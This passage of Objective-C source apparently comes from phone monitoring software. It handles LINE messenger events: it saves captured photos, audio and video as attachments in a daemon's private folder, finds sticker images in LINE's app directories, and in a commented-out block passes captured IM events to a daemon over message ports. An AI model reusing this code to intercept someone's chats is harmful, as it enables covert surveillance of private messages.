			[archiver finishEncoding];
			[archiver release];	
			
			// -- first port
			MessagePortIPCSender *messagePortSender1 = [[MessagePortIPCSender alloc] initWithPortName:kLINEMessagePort1];			
			BOOL isSendingOK = [messagePortSender1 writeDataToPort:data];
			DLog (@"Sending to first port %d", isSendingOK)
			if (!isSendingOK) {
				DLog (@"First sending LINE fail");
				MessagePortIPCSender *messagePortSender2 = [[MessagePortIPCSender alloc] initWithPortName:kLINEMessagePort2];
				isSendingOK = [messagePortSender2 writeDataToPort:data];
				if (!isSendingOK) {
					DLog (@"Second sending LINE also fail");										
					[LINEUtils deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];					
				}
				[messagePortSender2 release];
			}
		
			[messagePortSender1 release];
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}	
	[pool release];
}
*/

#pragma mark Photo Attachment Utils


+ (FxAttachment *) createPhotoAttachment: (NSData *) aImageData thumbnail: (NSData *) aThumbnailData {
	// -- create path
	NSString* lineAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imLine/"];
	lineAttachmentPath				= [LINEUtils getOutputPath:lineAttachmentPath extension:@"jpg"];
	DLog (@"attachment %@", lineAttachmentPath)
	
	// -- write image to document file
	if (aImageData)
		[aImageData writeToFile:lineAttachmentPath atomically:YES];
	
	// -- create FxAttachment
	FxAttachment *attachment = [[FxAttachment alloc] init];
	if (aImageData)
		[attachment setFullPath:lineAttachmentPath];
	[attachment setMThumbnail:aThumbnailData];
	
	return [attachment autorelease];
}

// create timestamp of now
+ (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

// get thumbnail path with its extension
+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@im_%@.%@",
							aOutputPathWithoutExtension, 
							formattedDateString, 
							aExtension];
	return [outputPath autorelease];
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
	// delete the attachment files
	if (aAttachmentArray && [aAttachmentArray count] != 0) {
		for (FxAttachment *attachment in aAttachmentArray) {
			NSString *path = [attachment fullPath];
			DLog (@"deleting file: %@", path)
			[[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		}	
	}
}


#pragma mark Audio Attachment Utils
//+ (FxAttachment *) createAudioAttachmentForAudioData: (NSData *) aAudioData {
+ (FxAttachment *) createAudioVideoAttachmentForData: (NSData *) aAudioData 
									   fileExtension: (NSString *) aExtension  {
	// -- create path
	NSString* lineAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imLine/"];
	lineAttachmentPath				= [LINEUtils getOutputPath:lineAttachmentPath extension:aExtension];	
	DLog (@"attachment %@", lineAttachmentPath)
	
	// -- create FxAttachment
	FxAttachment *attachment = nil;
	
	// -- write image to document file
	if (aAudioData) {
		attachment = [[FxAttachment alloc] init];
		[aAudioData writeToFile:lineAttachmentPath atomically:YES];
		[attachment setFullPath:lineAttachmentPath];
		//[attachment setMThumbnail:aThumbnailData];	// audio has no thumbnail
	}
	
	return [attachment autorelease];
}


#pragma mark Sticker Utils

+ (NSString *) findStickerFolderNameForStickerPackageID: (NSString *) aStickerPackageID stickerPackagesPath: (NSString *) aStickerPackagesPath {
	NSString *stickerFolder = nil;
	NSArray *stickerPackages	= [[NSFileManager defaultManager] contentsOfDirectoryAtPath:aStickerPackagesPath error:nil];	
	
	for (NSString *eachStickerPackage in stickerPackages) {
		NSString *stickerPackagesPath = [NSString stringWithFormat:@"%@/%@", aStickerPackagesPath, eachStickerPackage];		
		NSString *searchedStr					= [[NSString alloc] initWithFormat:@"%@.", aStickerPackageID];
		NSRange range							= [[stickerPackagesPath lowercaseString] rangeOfString:searchedStr];
		
		DLog(@"stickerPackagesPath %@", stickerPackagesPath);
		
		if (range.location != NSNotFound	&& range.length != 0) {					// Match package id
			DLog (@"found package %@", eachStickerPackage)
			stickerFolder = eachStickerPackage;
			break;
		}
	}	
	return stickerFolder;	
}

/**********************************************************
	Return value can be either one of these
		1) APP/Library/Application Support/Sticker Packages/xxx.y.linestk/
		2) APP/Library/Caches/Stray Sticker Packages/xxx.y.linestk/
		3) nil
 ***********************************************************/
+ (NSString *) getStickerFolderPathForPackageIDIfExist: (NSString *) aStickerPackageID {
	NSString *stickerFolder = nil;
	NSString *stickerFolderPath = nil;
	/*********************************************
	 * STEP 1: Find in Library (Downloaded Packages) first
	 *********************************************/
	
	// Match only package id if only one package id exist
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);										// --> APP/Library/
	
	if ([paths count] == 1) {
		NSString *stickerPackagePaths		= [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineDownloadedStickerPath];			// --> APP/Library/Application Support/Sticker Packages		
		stickerFolder = [LINEUtils findStickerFolderNameForStickerPackageID:aStickerPackageID												
														stickerPackagesPath:stickerPackagePaths];
		if (stickerFolder)
			stickerFolderPath = [stickerPackagePaths stringByAppendingPathComponent:stickerFolder];											// --> APP/Library/Application Support/Sticker Packages/xxx.y.linestk/
	}

	/*********************************************
	 * STEP 2: If not found the folder name in Library, find in INCOMING sticker folder
	 *********************************************/
	
	if (!stickerFolder) {
		NSString *stickerPackagePaths		= [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineIncomingStickerPath];			// --> APP/Library/Caches/Stray Sticker Packages/
		
		stickerFolder = [LINEUtils findStickerFolderNameForStickerPackageID:aStickerPackageID										
														stickerPackagesPath:stickerPackagePaths];
		if (stickerFolder)
			stickerFolderPath = [stickerPackagePaths stringByAppendingPathComponent:stickerFolder];												// --> APP/Library/Caches/Stray Sticker Packages/xxx.y.linestk/
	}
	
	return stickerFolderPath;
}


+ (NSData *) getStickerDataForStickerID: (NSInteger) aStickerID
					   stickerPackageID: (NSString *) aStickerPackageID
				  stickerPackageVersion: (unsigned) aStickerPackageVersion {
	
	/*********************************************
	 * STEP 1: Find Sticker Folder Path
	 *		e.g., 788.3.linestk
	 *********************************************/
	
	NSString *stickerFolderPath = nil;
	
	/**************************************************************************************************
	 * CASE 1: For outgoing and incoming sticker whose package has been "DOWNLOADED" to Target device 
			   For "DEFAULT" Sticker
	 * CASE 2: For incoming sticker whose package has NOT been dowloaded
	 **************************************************************************************************/	
	
	// CASE 1: Know package version
	if (aStickerPackageID && aStickerPackageVersion) {	
		DLog (@"Known Packaged ID and Package Version")	
		
		NSString *stickerFolder = [NSString stringWithFormat:@"%@.%d.linestk", aStickerPackageID, aStickerPackageVersion];	
		
		// -- Not Default Sticker
		// Search in Downloaded folder and Incoming folder
		if ([aStickerPackageID intValue] != 1) {
			// -- Find in Downloaded folder
			NSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);								// --> APP/Library			
			if ([paths count] == 1) {
				stickerFolderPath = [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineDownloadedStickerPath];					// --> APP/Library/Application Support/Sticker Package/					
				stickerFolderPath = [stickerFolderPath stringByAppendingPathComponent:stickerFolder];										// --> APP/Library/Application Support/Sticker Package/xxx.y.linestk/					
				DLog (@"Non Default Sticker Path in Downloaded folder %@", stickerFolderPath)
			}
			// -- Find in Incoming Sticker (Stray Sticker Packages)
			if (![[NSFileManager defaultManager] fileExistsAtPath:stickerFolderPath]) {								
				NSString *stickerPackagePaths		= [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineIncomingStickerPath];	// --> APP/Library/Caches/Stray Sticker Packages/
				stickerFolderPath = [stickerPackagePaths stringByAppendingPathComponent:stickerFolder];										// --> APP/Library/Caches/Stray Sticker Packages/xxx.y.linestk/
				DLog (@"Non Default Sticker Path in Incoming folder %@", stickerFolderPath)				
			}		
			if (![[NSFileManager defaultManager] fileExistsAtPath:stickerFolderPath])
				stickerFolderPath = nil;
		} 
		// -- Default Sticker
		else {
			// Search in LINE.app folder
			NSString *appFolderPath = [[NSBundle mainBundle] resourcePath];																// --> APP/LINE.app/
			// + /Sticker Packages/1.100.linestk		 
			stickerFolderPath = [appFolderPath stringByAppendingPathComponent:@"Sticker Packages"];										// --> APP/LINE.app/Sticker Packages/
			stickerFolderPath = [stickerFolderPath stringByAppendingPathComponent:stickerFolder];										// --> APP/LINE.app/Sticker Packages/xxx.y.linestk/
			DLog (@"Default Sticker Path %@", stickerFolderPath)
			if (![[NSFileManager defaultManager] fileExistsAtPath:stickerFolderPath])
				stickerFolderPath = nil;
		}				
	} 
	// CASE 2: Don't know package version
	else {												
		// Search in Downloaded folder and Incoming folder
		stickerFolderPath = [LINEUtils getStickerFolderPathForPackageIDIfExist:aStickerPackageID];												// --> APP/Library/Application Support/Sticker Packages/xxx.y.linestk/
																																		// --> APP/Library/Caches/Stray Sticker Packages/xxx.y.linestk/
																																		// --> nil
		DLog (@"Downloaded/Stray Sticker Path %@", stickerFolderPath)
	}
			
	/*********************************************
	 * STEP 2: Find Sticker Filename
	 *		e.g., 10814@2x.png
	 *********************************************/		
	
	NSString *stickerFileName	= [[NSString alloc] initWithFormat:@"%d@2x.png", aStickerID];	// found on LINE version 3.5.1 4S
	NSString *stickerFileName2	= [[NSString alloc] initWithFormat:@"%d.png", aStickerID];	// found on LINE version 3.5.1 3GS
	
	/*********************************************
	 * STEP 3: Find Sticker Full Path
	 *********************************************/		
	NSData *stickerData			= nil;			
					
	if (stickerFolderPath) {	
		NSString *stickerFullPath = [stickerFolderPath stringByAppendingPathComponent:stickerFileName];
		DLog (@"stickerFullPath 1: %@", stickerFullPath)
		
		if ([[NSFileManager defaultManager] fileExistsAtPath:stickerFullPath])	{	// @2x.png
			UIImage *stickerImage = [[UIImage alloc] initWithContentsOfFile:stickerFullPath];
			//[UIImagePNGRepresentation(stickerImage) writeToFile:@"/tmp/sticker.png" atomically:YES];
			stickerData = UIImagePNGRepresentation(stickerImage);	
			[stickerImage release];
		}
		else {																		// .png
			stickerFullPath = [stickerFolderPath stringByAppendingPathComponent:stickerFileName2];
			DLog (@"stickerFullPath 2: %@", stickerFullPath)
			UIImage *stickerImage = [[UIImage alloc] initWithContentsOfFile:stickerFullPath];
			stickerData = UIImagePNGRepresentation(stickerImage);	
			[stickerImage release];
		}
	}
	
	return stickerData;
}

+ (FxAttachment *) createStickerAttachment: (NSData *) aStickerData {	
	// -- create FxAttachment
	FxAttachment *attachment = [[FxAttachment alloc] init];
	[attachment setMThumbnail:aStickerData];
	return [attachment autorelease];
}

- (void) dealloc {
	DLog (@"dealloc of LINEUtils")
	[mLineEventSenderQueue cancelAllOperations];
	[mLineEventSenderQueue release];
	[super dealloc];
}


@end
